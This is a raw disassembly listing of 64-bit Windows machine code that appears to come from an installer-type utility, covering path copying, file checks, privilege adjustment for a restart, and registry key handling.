   1400016d3:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400016da:	48 85 c0             	test   %rax,%rax
   1400016dd:	74 13                	je     0x1400016f2
   1400016df:	41 8a 04 0a          	mov    (%r10,%rcx,1),%al
   1400016e3:	84 c0                	test   %al,%al
   1400016e5:	74 0b                	je     0x1400016f2
   1400016e7:	88 01                	mov    %al,(%rcx)
   1400016e9:	48 ff c1             	inc    %rcx
   1400016ec:	48 83 ea 01          	sub    $0x1,%rdx
   1400016f0:	75 e1                	jne    0x1400016d3
   1400016f2:	48 85 d2             	test   %rdx,%rdx
   1400016f5:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400016f9:	48 0f 45 c1          	cmovne %rcx,%rax
   1400016fd:	44 88 28             	mov    %r13b,(%rax)
   140001700:	80 7d 50 22          	cmpb   $0x22,0x50(%rbp)
   140001704:	75 0d                	jne    0x140001713
   140001706:	48 8d 15 23 80 00 00 	lea    0x8023(%rip),%rdx        # 0x140009730
   14000170d:	48 8d 45 51          	lea    0x51(%rbp),%rax
   140001711:	eb 0b                	jmp    0x14000171e
   140001713:	48 8d 15 1a 80 00 00 	lea    0x801a(%rip),%rdx        # 0x140009734
   14000171a:	48 8d 45 50          	lea    0x50(%rbp),%rax
   14000171e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001723:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001728:	e8 bb fe ff ff       	call   0x1400015e8
   14000172d:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140001732:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140001736:	48 8b f0             	mov    %rax,%rsi
   140001739:	48 85 ff             	test   %rdi,%rdi
   14000173c:	74 6c                	je     0x1400017aa
   14000173e:	48 8b c3             	mov    %rbx,%rax
   140001741:	48 ff c0             	inc    %rax
   140001744:	44 38 2c 07          	cmp    %r13b,(%rdi,%rax,1)
   140001748:	75 f7                	jne    0x140001741
   14000174a:	48 83 f8 03          	cmp    $0x3,%rax
   14000174e:	72 5a                	jb     0x1400017aa
   140001750:	8a 47 01             	mov    0x1(%rdi),%al
   140001753:	b1 5c                	mov    $0x5c,%cl
   140001755:	3c 3a                	cmp    $0x3a,%al
   140001757:	75 05                	jne    0x14000175e
   140001759:	38 4f 02             	cmp    %cl,0x2(%rdi)
   14000175c:	74 08                	je     0x140001766
   14000175e:	38 0f                	cmp    %cl,(%rdi)
   140001760:	75 48                	jne    0x1400017aa
   140001762:	3a c1                	cmp    %cl,%al
   140001764:	75 44                	jne    0x1400017aa
   140001766:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000176b:	4c 8b c7             	mov    %rdi,%r8
   14000176e:	4c 2b c0             	sub    %rax,%r8
   140001771:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001776:	ba 04 01 00 00       	mov    $0x104,%edx
   14000177b:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140001782:	48 85 c0             	test   %rax,%rax
   140001785:	74 13                	je     0x14000179a
   140001787:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   14000178b:	84 c0                	test   %al,%al
   14000178d:	74 0b                	je     0x14000179a
   14000178f:	88 01                	mov    %al,(%rcx)
   140001791:	48 ff c1             	inc    %rcx
   140001794:	48 83 ea 01          	sub    $0x1,%rdx
   140001798:	75 e1                	jne    0x14000177b
   14000179a:	48 85 d2             	test   %rdx,%rdx
   14000179d:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400017a1:	48 0f 45 c1          	cmovne %rcx,%rax
   1400017a5:	44 88 28             	mov    %r13b,(%rax)
   1400017a8:	eb 5a                	jmp    0x140001804
   1400017aa:	41 b9 04 01 00 00    	mov    $0x104,%r9d
   1400017b0:	4c 8d 05 59 be 00 00 	lea    0xbe59(%rip),%r8        # 0x14000d610
   1400017b7:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400017bc:	41 8b d1             	mov    %r9d,%edx
   1400017bf:	4c 2b c0             	sub    %rax,%r8
   1400017c2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400017c7:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400017ce:	48 85 c0             	test   %rax,%rax
   1400017d1:	74 13                	je     0x1400017e6
   1400017d3:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400017d7:	84 c0                	test   %al,%al
   1400017d9:	74 0b                	je     0x1400017e6
   1400017db:	88 01                	mov    %al,(%rcx)
   1400017dd:	48 ff c1             	inc    %rcx
   1400017e0:	48 83 ea 01          	sub    $0x1,%rdx
   1400017e4:	75 e1                	jne    0x1400017c7
   1400017e6:	48 85 d2             	test   %rdx,%rdx
   1400017e9:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400017ed:	4c 8b c7             	mov    %rdi,%r8
   1400017f0:	41 8b d1             	mov    %r9d,%edx
   1400017f3:	48 0f 45 c1          	cmovne %rcx,%rax
   1400017f7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400017fc:	44 88 28             	mov    %r13b,(%rax)
   1400017ff:	e8 a4 63 00 00       	call   0x140007ba8
   140001804:	ba 2e 00 00 00       	mov    $0x2e,%edx
   140001809:	48 8b cf             	mov    %rdi,%rcx
   14000180c:	e8 57 65 00 00       	call   0x140007d68
   140001811:	48 85 c0             	test   %rax,%rax
   140001814:	0f 84 01 02 00 00    	je     0x140001a1b
   14000181a:	48 8d 0d 17 7f 00 00 	lea    0x7f17(%rip),%rcx        # 0x140009738
   140001821:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001825:	ba 01 00 00 00       	mov    $0x1,%edx
   14000182a:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000182f:	44 8b cb             	mov    %ebx,%r9d
   140001832:	4c 8b c0             	mov    %rax,%r8
   140001835:	8d 4a 7e             	lea    0x7e(%rdx),%ecx
   140001838:	48 ff 15 b9 79 00 00 	rex.W call *0x79b9(%rip)        # 0x1400091f8
   14000183f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001844:	83 f8 02             	cmp    $0x2,%eax
   140001847:	0f 85 ce 01 00 00    	jne    0x140001a1b
   14000184d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001852:	48 ff 15 af 79 00 00 	rex.W call *0x79af(%rip)        # 0x140009208
   140001859:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000185e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001861:	0f 84 8c 01 00 00    	je     0x1400019f3
   140001867:	c1 e8 04             	shr    $0x4,%eax
   14000186a:	f7 d0                	not    %eax
   14000186c:	83 e0 01             	and    $0x1,%eax
   14000186f:	0f 84 7e 01 00 00    	je     0x1400019f3
   140001875:	48 8d 15 c4 7e 00 00 	lea    0x7ec4(%rip),%rdx        # 0x140009740
   14000187c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001881:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001886:	e8 5d fd ff ff       	call   0x1400015e8
   14000188b:	48 8b c8             	mov    %rax,%rcx
   14000188e:	48 85 c0             	test   %rax,%rax
   140001891:	74 22                	je     0x1400018b5
   140001893:	44 38 29             	cmp    %r13b,(%rcx)
   140001896:	48 8d 15 a7 7e 00 00 	lea    0x7ea7(%rip),%rdx        # 0x140009744
   14000189d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400018a2:	48 0f 45 c1          	cmovne %rcx,%rax
   1400018a6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400018ab:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400018b0:	e8 33 fd ff ff       	call   0x1400015e8
   1400018b5:	ba 00 02 00 00       	mov    $0x200,%edx
   1400018ba:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400018bf:	48 ff 15 02 7b 00 00 	rex.W call *0x7b02(%rip)        # 0x1400093c8
   1400018c6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400018cb:	48 8b d8             	mov    %rax,%rbx
   1400018ce:	48 85 c0             	test   %rax,%rax
   1400018d1:	0f 84 cb 01 00 00    	je     0x140001aa2
   1400018d7:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400018dc:	48 8d 3d 45 a8 00 00 	lea    0xa845(%rip),%rdi        # 0x14000c128
   1400018e3:	48 8b cf             	mov    %rdi,%rcx
   1400018e6:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400018eb:	48 8d 15 56 7e 00 00 	lea    0x7e56(%rip),%rdx        # 0x140009748
   1400018f2:	44 38 2e             	cmp    %r13b,(%rsi)
   1400018f5:	48 0f 45 ce          	cmovne %rsi,%rcx
   1400018f9:	45 33 c0             	xor    %r8d,%r8d
   1400018fc:	48 ff 15 95 79 00 00 	rex.W call *0x7995(%rip)        # 0x140009298
   140001903:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001908:	4c 8b cb             	mov    %rbx,%r9
   14000190b:	41 c7 07 01 00 00 00 	movl   $0x1,(%r15)
   140001912:	89 05 28 bc 00 00    	mov    %eax,0xbc28(%rip)        # 0x14000d540
   140001918:	4c 8d 05 e1 7d 00 00 	lea    0x7de1(%rip),%r8        # 0x140009700
   14000191f:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140001924:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001929:	48 8d 15 20 7e 00 00 	lea    0x7e20(%rip),%rdx        # 0x140009750
   140001930:	48 8d 0d 29 7e 00 00 	lea    0x7e29(%rip),%rcx        # 0x140009760
   140001937:	c7 44 24 20 08 00 00 	movl   $0x8,0x20(%rsp)
   14000193e:	00 
   14000193f:	48 ff 15 5a 79 00 00 	rex.W call *0x795a(%rip)        # 0x1400092a0
   140001946:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000194b:	85 c0                	test   %eax,%eax
   14000194d:	74 35                	je     0x140001984
   14000194f:	83 0d 0e c5 00 00 04 	orl    $0x4,0xc50e(%rip)        # 0x14000de64
   140001956:	ba 04 01 00 00       	mov    $0x104,%edx
   14000195b:	44 38 2e             	cmp    %r13b,(%rsi)
   14000195e:	49 8b ce             	mov    %r14,%rcx
   140001961:	48 0f 45 fe          	cmovne %rsi,%rdi
   140001965:	4c 8b c7             	mov    %rdi,%r8
   140001968:	e8 9b f6 ff ff       	call   0x140001008
   14000196d:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001972:	ba 00 02 00 00       	mov    $0x200,%edx
   140001977:	48 8b cb             	mov    %rbx,%rcx
   14000197a:	e8 89 f6 ff ff       	call   0x140001008
   14000197f:	e9 4d 02 00 00       	jmp    0x140001bd1
   140001984:	83 25 d9 c4 00 00 fb 	andl   $0xfffffffb,0xc4d9(%rip)        # 0x14000de64
   14000198b:	66 44 39 2d e5 c4 00 	cmp    %r13w,0xc4e5(%rip)        # 0x14000de78
   140001992:	00 
   140001993:	75 25                	jne    0x1400019ba
   140001995:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000199b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400019a0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400019a5:	4c 8d 35 bc 7d 00 00 	lea    0x7dbc(%rip),%r14        # 0x140009768
   1400019ac:	48 ff 15 45 7a 00 00 	rex.W call *0x7a45(%rip)        # 0x1400093f8
   1400019b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400019b8:	eb 07                	jmp    0x1400019c1
   1400019ba:	4c 8d 35 b7 7d 00 00 	lea    0x7db7(%rip),%r14        # 0x140009778
   1400019c1:	44 38 2e             	cmp    %r13b,(%rsi)
   1400019c4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400019c9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400019ce:	4c 8d 05 03 a7 00 00 	lea    0xa703(%rip),%r8        # 0x14000c0d8
   1400019d5:	48 0f 45 fe          	cmovne %rsi,%rdi
   1400019d9:	4d 8b ce             	mov    %r14,%r9
   1400019dc:	ba 00 02 00 00       	mov    $0x200,%edx
   1400019e1:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400019e6:	48 8b cb             	mov    %rbx,%rcx
   1400019e9:	e8 5e f7 ff ff       	call   0x14000114c
   1400019ee:	e9 de 01 00 00       	jmp    0x140001bd1
   1400019f3:	45 33 c9             	xor    %r9d,%r9d
   1400019f6:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400019fb:	ba 25 05 00 00       	mov    $0x525,%edx
   140001a00:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140001a05:	33 c9                	xor    %ecx,%ecx
   140001a07:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140001a0e:	00 
   140001a0f:	e8 b8 33 00 00       	call   0x140004dcc
   140001a14:	33 c0                	xor    %eax,%eax
   140001a16:	e9 bf 01 00 00       	jmp    0x140001bda
   140001a1b:	ba 2e 00 00 00       	mov    $0x2e,%edx
   140001a20:	48 8b cf             	mov    %rdi,%rcx
   140001a23:	e8 40 63 00 00       	call   0x140007d68
   140001a28:	48 85 c0             	test   %rax,%rax
   140001a2b:	0f 84 9a 00 00 00    	je     0x140001acb
   140001a31:	48 8d 15 50 7d 00 00 	lea    0x7d50(%rip),%rdx        # 0x140009788
   140001a38:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001a3c:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140001a41:	44 8b cb             	mov    %ebx,%r9d
   140001a44:	ba 01 00 00 00       	mov    $0x1,%edx
   140001a49:	4c 8b c0             	mov    %rax,%r8
   140001a4c:	8d 4a 7e             	lea    0x7e(%rdx),%ecx
   140001a4f:	48 ff 15 a2 77 00 00 	rex.W call *0x77a2(%rip)        # 0x1400091f8
   140001a56:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001a5b:	83 f8 02             	cmp    $0x2,%eax
   140001a5e:	75 6b                	jne    0x140001acb
   140001a60:	48 8d 35 d1 a6 00 00 	lea    0xa6d1(%rip),%rsi        # 0x14000c138
   140001a67:	48 8b c3             	mov    %rbx,%rax
   140001a6a:	48 ff c0             	inc    %rax
   140001a6d:	44 38 2c 06          	cmp    %r13b,(%rsi,%rax,1)
   140001a71:	75 f7                	jne    0x140001a6a
   140001a73:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001a78:	48 ff c3             	inc    %rbx
   140001a7b:	44 38 2c 19          	cmp    %r13b,(%rcx,%rbx,1)
   140001a7f:	75 f7                	jne    0x140001a78
   140001a81:	48 8d 3c 18          	lea    (%rax,%rbx,1),%rdi
   140001a85:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001a8a:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140001a8e:	48 ff 15 33 79 00 00 	rex.W call *0x7933(%rip)        # 0x1400093c8
   140001a95:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001a9a:	48 8b d8             	mov    %rax,%rbx
   140001a9d:	48 85 c0             	test   %rax,%rax
   140001aa0:	75 10                	jne    0x140001ab2
   140001aa2:	45 33 c9             	xor    %r9d,%r9d
   140001aa5:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140001aaa:	45 33 c0             	xor    %r8d,%r8d
   140001aad:	e9 4e ff ff ff       	jmp    0x140001a00
   140001ab2:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140001ab7:	4c 8b c6             	mov    %rsi,%r8
   140001aba:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140001abe:	48 8b c8             	mov    %rax,%rcx
   140001ac1:	e8 86 f6 ff ff       	call   0x14000114c
   140001ac6:	e9 06 01 00 00       	jmp    0x140001bd1
   140001acb:	bf 00 04 00 00       	mov    $0x400,%edi
   140001ad0:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001ad5:	8b d7                	mov    %edi,%edx
   140001ad7:	48 ff 15 ea 78 00 00 	rex.W call *0x78ea(%rip)        # 0x1400093c8
   140001ade:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ae3:	48 8b d8             	mov    %rax,%rbx
   140001ae6:	48 85 c0             	test   %rax,%rax
   140001ae9:	74 b7                	je     0x140001aa2
   140001aeb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001af0:	48 ff 15 11 77 00 00 	rex.W call *0x7711(%rip)        # 0x140009208
   140001af7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001afc:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001aff:	74 7d                	je     0x140001b7e
   140001b01:	a8 10                	test   $0x10,%al
   140001b03:	75 79                	jne    0x140001b7e
   140001b05:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001b0a:	8b d7                	mov    %edi,%edx
   140001b0c:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   140001b13:	4c 2b c0             	sub    %rax,%r8
   140001b16:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001b1d:	48 8d 82 fe fb ff 7f 	lea    0x7ffffbfe(%rdx),%rax
   140001b24:	48 85 c0             	test   %rax,%rax
   140001b27:	74 13                	je     0x140001b3c
   140001b29:	42 8a 04 01          	mov    (%rcx,%r8,1),%al
   140001b2d:	84 c0                	test   %al,%al
   140001b2f:	74 0b                	je     0x140001b3c
   140001b31:	88 01                	mov    %al,(%rcx)
   140001b33:	48 ff c1             	inc    %rcx
   140001b36:	48 83 ea 01          	sub    $0x1,%rdx
   140001b3a:	75 e1                	jne    0x140001b1d
   140001b3c:	48 85 d2             	test   %rdx,%rdx
   140001b3f:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001b43:	48 0f 45 c1          	cmovne %rcx,%rax
   140001b47:	44 88 28             	mov    %r13b,(%rax)
   140001b4a:	48 85 f6             	test   %rsi,%rsi
   140001b4d:	74 6d                	je     0x140001bbc
   140001b4f:	44 38 2e             	cmp    %r13b,(%rsi)
   140001b52:	74 68                	je     0x140001bbc
   140001b54:	4c 8d 05 d9 7b 00 00 	lea    0x7bd9(%rip),%r8        # 0x140009734
   140001b5b:	48 8b d7             	mov    %rdi,%rdx
   140001b5e:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001b65:	e8 1a f5 ff ff       	call   0x140001084
   140001b6a:	4c 8b c6             	mov    %rsi,%r8
   140001b6d:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001b74:	48 8b d7             	mov    %rdi,%rdx
   140001b77:	e8 08 f5 ff ff       	call   0x140001084
   140001b7c:	eb 3e                	jmp    0x140001bbc
   140001b7e:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   140001b85:	4c 2b f0             	sub    %rax,%r14
   140001b88:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   140001b8f:	48 8d 87 fe fb ff 7f 	lea    0x7ffffbfe(%rdi),%rax
   140001b96:	48 85 c0             	test   %rax,%rax
   140001b99:	74 13                	je     0x140001bae
   140001b9b:	42 8a 04 32          	mov    (%rdx,%r14,1),%al
   140001b9f:	84 c0                	test   %al,%al
   140001ba1:	74 0b                	je     0x140001bae
   140001ba3:	88 02                	mov    %al,(%rdx)
   140001ba5:	48 ff c2             	inc    %rdx
   140001ba8:	48 83 ef 01          	sub    $0x1,%rdi
   140001bac:	75 e1                	jne    0x140001b8f
   140001bae:	48 85 ff             	test   %rdi,%rdi
   140001bb1:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
   140001bb5:	48 0f 45 ca          	cmovne %rdx,%rcx
   140001bb9:	44 88 29             	mov    %r13b,(%rcx)
   140001bbc:	4c 8b c3             	mov    %rbx,%r8
   140001bbf:	44 88 2b             	mov    %r13b,(%rbx)
   140001bc2:	48 8b d3             	mov    %rbx,%rdx
   140001bc5:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001bcc:	e8 9b 0e 00 00       	call   0x140002a6c
   140001bd1:	49 89 1c 24          	mov    %rbx,(%r12)
   140001bd5:	b8 01 00 00 00       	mov    $0x1,%eax
   140001bda:	48 8b 8d 60 05 00 00 	mov    0x560(%rbp),%rcx
   140001be1:	48 33 cc             	xor    %rsp,%rcx
   140001be4:	e8 87 68 00 00       	call   0x140008470
   140001be9:	48 8b 9c 24 b8 06 00 	mov    0x6b8(%rsp),%rbx
   140001bf0:	00 
   140001bf1:	48 81 c4 70 06 00 00 	add    $0x670,%rsp
   140001bf8:	41 5f                	pop    %r15
   140001bfa:	41 5e                	pop    %r14
   140001bfc:	41 5d                	pop    %r13
   140001bfe:	41 5c                	pop    %r12
   140001c00:	5f                   	pop    %rdi
   140001c01:	5e                   	pop    %rsi
   140001c02:	5d                   	pop    %rbp
   140001c03:	c3                   	ret
   140001c04:	cc                   	int3
   140001c05:	cc                   	int3
   140001c06:	cc                   	int3
   140001c07:	cc                   	int3
   140001c08:	cc                   	int3
   140001c09:	cc                   	int3
   140001c0a:	cc                   	int3
   140001c0b:	cc                   	int3
   140001c0c:	40 53                	rex push %rbx
   140001c0e:	48 83 ec 50          	sub    $0x50,%rsp
   140001c12:	48 8b 05 ef a3 00 00 	mov    0xa3ef(%rip),%rax        # 0x14000c008
   140001c19:	48 33 c4             	xor    %rsp,%rax
   140001c1c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001c21:	48 ff 15 b8 77 00 00 	rex.W call *0x77b8(%rip)        # 0x1400093e0
   140001c28:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c2d:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001c32:	ba 28 00 00 00       	mov    $0x28,%edx
   140001c37:	48 8b c8             	mov    %rax,%rcx
   140001c3a:	48 ff 15 0f 75 00 00 	rex.W call *0x750f(%rip)        # 0x140009150
   140001c41:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c46:	33 c9                	xor    %ecx,%ecx
   140001c48:	85 c0                	test   %eax,%eax
   140001c4a:	75 23                	jne    0x140001c6f
   140001c4c:	21 44 24 28          	and    %eax,0x28(%rsp)
   140001c50:	45 33 c9             	xor    %r9d,%r9d
   140001c53:	45 33 c0             	xor    %r8d,%r8d
   140001c56:	ba f5 04 00 00       	mov    $0x4f5,%edx
   140001c5b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140001c62:	00 
   140001c63:	e8 64 31 00 00       	call   0x140004dcc
   140001c68:	33 c0                	xor    %eax,%eax
   140001c6a:	e9 9e 00 00 00       	jmp    0x140001d0d
   140001c6f:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   140001c74:	48 8d 15 15 7b 00 00 	lea    0x7b15(%rip),%rdx        # 0x140009790
   140001c7b:	48 ff 15 e6 74 00 00 	rex.W call *0x74e6(%rip)        # 0x140009168
   140001c82:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c87:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001c8c:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140001c91:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140001c97:	45 33 c9             	xor    %r9d,%r9d
   140001c9a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001ca0:	33 d2                	xor    %edx,%edx
   140001ca2:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140001ca9:	00 
   140001caa:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%rsp)
   140001cb1:	00 
   140001cb2:	48 ff 15 d7 74 00 00 	rex.W call *0x74d7(%rip)        # 0x140009190
   140001cb9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001cbe:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001cc3:	8b d8                	mov    %eax,%ebx
   140001cc5:	48 ff 15 6c 75 00 00 	rex.W call *0x756c(%rip)        # 0x140009238
   140001ccc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001cd1:	85 db                	test   %ebx,%ebx
   140001cd3:	75 17                	jne    0x140001cec
   140001cd5:	ba f6 04 00 00       	mov    $0x4f6,%edx
   140001cda:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140001cdf:	45 33 c9             	xor    %r9d,%r9d
   140001ce2:	45 33 c0             	xor    %r8d,%r8d
   140001ce5:	33 c9                	xor    %ecx,%ecx
   140001ce7:	e9 6f ff ff ff       	jmp    0x140001c5b
   140001cec:	33 d2                	xor    %edx,%edx
   140001cee:	8d 4a 02             	lea    0x2(%rdx),%ecx
   140001cf1:	48 ff 15 58 78 00 00 	rex.W call *0x7858(%rip)        # 0x140009550
   140001cf8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001cfd:	85 c0                	test   %eax,%eax
   140001cff:	75 07                	jne    0x140001d08
   140001d01:	ba f7 04 00 00       	mov    $0x4f7,%edx
   140001d06:	eb d2                	jmp    0x140001cda
   140001d08:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d0d:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140001d12:	48 33 cc             	xor    %rsp,%rcx
   140001d15:	e8 56 67 00 00       	call   0x140008470
   140001d1a:	48 83 c4 50          	add    $0x50,%rsp
   140001d1e:	5b                   	pop    %rbx
   140001d1f:	c3                   	ret
   140001d20:	cc                   	int3
   140001d21:	cc                   	int3
   140001d22:	cc                   	int3
   140001d23:	cc                   	int3
   140001d24:	cc                   	int3
   140001d25:	cc                   	int3
   140001d26:	cc                   	int3
   140001d27:	cc                   	int3
   140001d28:	48 8b c4             	mov    %rsp,%rax
   140001d2b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001d2f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001d33:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001d37:	55                   	push   %rbp
   140001d38:	41 55                	push   %r13
   140001d3a:	41 56                	push   %r14
   140001d3c:	48 8d a8 58 fe ff ff 	lea    -0x1a8(%rax),%rbp
   140001d43:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140001d4a:	48 8b 05 b7 a2 00 00 	mov    0xa2b7(%rip),%rax        # 0x14000c008
   140001d51:	48 33 c4             	xor    %rsp,%rax
   140001d54:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140001d5b:	be 04 01 00 00       	mov    $0x104,%esi
   140001d60:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001d65:	44 8b c6             	mov    %esi,%r8d
   140001d68:	33 d2                	xor    %edx,%edx
   140001d6a:	e8 9a 6d 00 00       	call   0x140008b09
   140001d6f:	44 8b c6             	mov    %esi,%r8d
   140001d72:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001d76:	33 d2                	xor    %edx,%edx
   140001d78:	e8 8c 6d 00 00       	call   0x140008b09
   140001d7d:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140001d82:	45 33 f6             	xor    %r14d,%r14d
   140001d85:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d8a:	48 8d 15 f7 a2 00 00 	lea    0xa2f7(%rip),%rdx        # 0x14000c088
   140001d91:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001d96:	45 33 c9             	xor    %r9d,%r9d
   140001d99:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001d9e:	45 33 c0             	xor    %r8d,%r8d
   140001da1:	4c 21 74 24 30       	and    %r14,0x30(%rsp)
   140001da6:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140001dad:	c7 44 24 28 1f 00 02 	movl   $0x2001f,0x28(%rsp)
   140001db4:	00 
   140001db5:	44 21 74 24 20       	and    %r14d,0x20(%rsp)
   140001dba:	48 ff 15 9f 73 00 00 	rex.W call *0x739f(%rip)        # 0x140009160
   140001dc1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001dc6:	85 c0                	test   %eax,%eax
   140001dc8:	0f 85 4b 02 00 00    	jne    0x140002019
   140001dce:	33 db                	xor    %ebx,%ebx
   140001dd0:	8d 7e c4             	lea    -0x3c(%rsi),%edi
   140001dd3:	44 8b cb             	mov    %ebx,%r9d
   140001dd6:	4c 8d 05 e3 a2 00 00 	lea    0xa2e3(%rip),%r8        # 0x14000c0c0
   140001ddd:	ba 50 00 00 00       	mov    $0x50,%edx
   140001de2:	48 8d 0d e7 a9 00 00 	lea    0xa9e7(%rip),%rcx        # 0x14000c7d0
   140001de9:	e8 5e f3 ff ff       	call   0x14000114c
   140001dee:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001df3:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   140001df8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001dfd:	48 8d 15 cc a9 00 00 	lea    0xa9cc(%rip),%rdx        # 0x14000c7d0
   140001e04:	4c 21 74 24 20       	and    %r14,0x20(%rsp)
   140001e09:	45 33 c9             	xor    %r9d,%r9d
   140001e0c:	45 33 c0             	xor    %r8d,%r8d
   140001e0f:	48 ff 15 62 73 00 00 	rex.W call *0x7362(%rip)        # 0x140009178
   140001e16:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e1b:	85 c0                	test   %eax,%eax
   140001e1d:	75 06                	jne    0x140001e25
   140001e1f:	ff c3                	inc    %ebx
   140001e21:	3b df                	cmp    %edi,%ebx
   140001e23:	7c ae                	jl     0x140001dd3
   140001e25:	3b df                	cmp    %edi,%ebx
   140001e27:	75 1d                	jne    0x140001e46
